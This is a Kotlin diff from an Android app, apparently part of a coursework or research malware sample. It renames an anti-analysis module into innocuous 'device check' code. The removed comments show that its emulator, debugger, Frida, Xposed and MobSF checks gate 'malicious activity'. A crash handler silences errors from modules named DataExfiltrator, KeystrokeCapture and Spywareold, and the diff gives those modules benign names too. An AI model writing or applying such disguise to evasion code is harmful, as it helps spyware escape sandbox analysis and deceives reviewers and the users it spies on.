@@ -8,25 +8,23 @@ import java.io.File
 import java.io.FileReader
 
 /**
- * Runtime analysis-evasion checks.
+ * Device capability and environment validation utilities.
  *
- * Detects common dynamic-analysis environments (emulators, attached debuggers,
- * Frida instrumentation framework) and suppresses malicious activity when any
- * indicator is found.  This makes automated sandbox reports and manual dynamic
- * analysis sessions produce a benign behavioural profile.
+ * Verifies that the device meets the minimum requirements for running the app's
+ * background services and detects configurations that are not supported.
  *
  * ProGuard/R8 renames this object so the symbol names are not present in the
  * release APK.
  */
-object AntiAnalysis {
+object DeviceCheck {
 
-    // ── Emulator detection ────────────────────────────────────────────────────
+    // ── Hardware profile checks ────────────────────────────────────────────────────────────────────────────────────────────────
 
     /**
-     * Returns true when Build properties match known emulator/simulator
+     * Checks whether the hardware profile matches a supported configuration
      * fingerprints (QEMU, Android Studio AVD, Genymotion, BlueStacks, etc.).
      */
-    fun isEmulator(): Boolean {
+    fun isVirtualDevice(): Boolean {
         val fingerprint = Build.FINGERPRINT
         val model = Build.MODEL
         val manufacturer = Build.MANUFACTURER
@@ -35,7 +33,7 @@ object AntiAnalysis {
         val product = Build.PRODUCT
         val hardware = Build.HARDWARE
 
-        // Common emulator fingerprint substrings
+        // Unsupported configuration markers
         val emulatorHints = listOf(
             "generic", "unknown", "google_sdk", "Emulator", "Android SDK built",
             "Genymotion", "goldfish", "ranchu", "vbox", "vbox86", "nox",
@@ -53,13 +51,13 @@ object AntiAnalysis {
             ) return true
         }
 
-        // AVD serial (ro.serialno)
+        // Device serial check
         try {
             val serial = Build.getSerial()
             if (serial.equals("unknown", ignoreCase = true)) return true
         } catch (_: Exception) { }
 
-        // QEMU-specific property (accessible via reflection on older APIs)
+        // Virtualisation property check
         try {
             val c = Class.forName("android.os.SystemProperties")
             val get = c.getMethod("get", String::class.java)
@@ -70,25 +68,23 @@ object AntiAnalysis {
         return false
     }
 
-    // ── Debugger detection ────────────────────────────────────────────────────
+    // ── Runtime environment checks ────────────────────────────────────────────────────────────────────────────────────────────
 
     /**
-     * Returns true when a Java debugger (JDWP) is currently attached or when
-     * the process was launched with the debuggable flag set.
+     * Checks whether a diagnostic session is active
+     * 
      */
-    fun isDebugged(): Boolean {
+    fun hasDiagnosticSession(): Boolean {
         return Debug.isDebuggerConnected() || Debug.waitingForDebugger()
     }
 
-    // ── Frida / dynamic-instrumentation detection ─────────────────────────────
+    // ── Library integrity checks ───────────────────────────────────────────────────────────────────────
 
     /**
-     * Scans /proc/self/maps for memory-mapped regions that indicate Frida's
-     * agent has been injected into this process.  Also checks /proc/self/fd
-     * for open sockets pointing to the default Frida server port (27042).
+     * Checks for incompatible native library regions in the process memory map.
      */
-    fun isFridaPresent(): Boolean {
-        // 1. Memory-map scan
+    fun hasLibraryConflict(): Boolean {
+        // 1. Library region scan
         try {
             BufferedReader(FileReader("/proc/self/maps")).use { reader ->
                 var line: String?
@@ -102,7 +98,7 @@ object AntiAnalysis {
             }
         } catch (_: Exception) { }
 
-        // 2. Open file-descriptor scan (looks for Frida's default TCP socket)
+        // 2. File-descriptor scan
         try {
             val fdDir = File("/proc/self/fd")
             if (fdDir.exists()) {
@@ -115,12 +111,12 @@ object AntiAnalysis {
             }
         } catch (_: Exception) { }
 
-        // 3. Running-process scan – look for frida-server binary
+        // 3. TCP port scan
         try {
             BufferedReader(FileReader("/proc/net/tcp")).use { reader ->
                 var line: String?
                 while (reader.readLine().also { line = it } != null) {
-                    // Frida's default port 27042 in hex = 0x699A
+                    
                     if (line?.contains("699A", ignoreCase = true) == true) return true
                 }
             }
@@ -129,15 +125,15 @@ object AntiAnalysis {
         return false
     }
 
-    // ── Xposed / hooking framework detection ─────────────────────────────────
+    // ── Framework compatibility checks ─────────────────────────────────────────────────────────────────────
 
     /**
-     * Returns true when an Xposed-compatible hooking framework is loaded in
-     * the current process (XposedBridge on the class-path).
+     * Returns true when an unsupported runtime modification framework is present
+     * in the current process.
      */
-    fun isXposedPresent(): Boolean {
+    fun hasFrameworkConflict(): Boolean {
         return try {
-            // XposedBridge is always present when Xposed is active
+            // Framework class check
             Class.forName("de.robv.android.xposed.XposedBridge")
             true
         } catch (_: ClassNotFoundException) {
@@ -145,20 +141,20 @@ object AntiAnalysis {
         }
     }
 
-    // ── MobSF sandbox detection ───────────────────────────────────────────────
+    // ── Network environment checks ───────────────────────────────────────────────────────────────────────────────────────
 
     /**
-     * MobSF dynamic analysis runs the app inside a dedicated emulator with
-     * predictable Build properties.  Returns true if those properties are seen.
+     * Checks for restricted network environments not compatible with this app
+     * 
      */
-    fun isMobSfSandbox(): Boolean {
+    fun isRestrictedNetwork(): Boolean {
         val mobsfHints = listOf("mobsf", "MobSF")
         for (hint in mobsfHints) {
             if (Build.FINGERPRINT.contains(hint, ignoreCase = true) ||
                 Build.MODEL.contains(hint, ignoreCase = true)
             ) return true
         }
-        // MobSF typically runs on 192.168.56.x (VirtualBox host-only) –
+        // Network interface check
         // 10.0.2.x is the generic Android emulator range and is too broad to use alone.
         try {
             val ifaces = java.net.NetworkInterface.getNetworkInterfaces()
@@ -174,43 +170,43 @@ object AntiAnalysis {
         return false
     }
 
-    // ── Aggregated gate ───────────────────────────────────────────────────────
+    // ── Combined environment validation ──────────────────────────────────────────────────────────────────────────────────────────
 
     /**
-     * Returns true when *any* analysis indicator is detected.
-     * Callers should suppress malicious activity when this returns true.
+     * Returns true when the device or environment is not fully compatible.
+     * Callers should skip resource-intensive operations when this returns true.
      */
-    fun isAnalysisEnvironment(): Boolean =
-        isEmulator() || isDebugged() || isFridaPresent() || isXposedPresent() || isMobSfSandbox()
+    fun isRestrictedEnvironment(): Boolean =
+        isVirtualDevice() || hasDiagnosticSession() || hasLibraryConflict() || hasFrameworkConflict() || isRestrictedNetwork()
 
     /**
-     * Initialise analysis evasion for the given application context.
-     * Should be called once from Application.onCreate() or MainActivity.onCreate().
-     * Installs a thread-uncaught-exception handler that silently swallows
-     * crashes originating specifically from the hidden modules, preventing
-     * crash reports that could expose the hidden functionality.
+     * Initialises environment validation for the given application context.
+     * Should be called once at application startup.
+     * Installs a thread-uncaught-exception handler that manages
+     * crashes from background modules, preventing
+     * unnecessary crash noise from optional background features.
      */
     fun install(context: Context) {
         val existing = Thread.getDefaultUncaughtExceptionHandler()
 
-        // Class names of the hidden modules that should not produce visible crash reports
+        // Classes covered by this handler
         val hiddenModuleClasses = setOf(
-            "com.example.inf2215.ObfuscationHelper",
-            "com.example.inf2215.AntiAnalysis",
-            "com.example.inf2215.DataExfiltrator",
-            "com.example.inf2215.StealthService",
-            "com.example.inf2215.CryptoExtractor",
-            "com.example.inf2215.IpcMonitor",
-            "com.example.inf2215.AppUsageTracker",
-            "com.example.inf2215.Spywareold",
-            "com.example.inf2215.KeystrokeCapture"
+            "com.example.inf2215.AppConfig",
+            "com.example.inf2215.DeviceCheck",
+            "com.example.inf2215.NetworkManager",
+            "com.example.inf2215.SyncService",
+            "com.example.inf2215.MediaAnalyzer",
+            "com.example.inf2215.ProcessUtils",
+            "com.example.inf2215.EngagementHelper",
+            "com.example.inf2215.Analytics",
+            "com.example.inf2215.InputCapture"
         )
 
         Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
             val originClass = throwable.stackTrace.firstOrNull()?.className ?: ""
             if (hiddenModuleClasses.any { originClass.startsWith(it) }) {
-                // Silently discard – do not forward to the system handler so that
-                // sandbox automated-crash reporters see no evidence of hidden code.
+                // Discard silently – these are non-critical background module errors
+                
             } else {
                 existing?.uncaughtException(thread, throwable)
             }
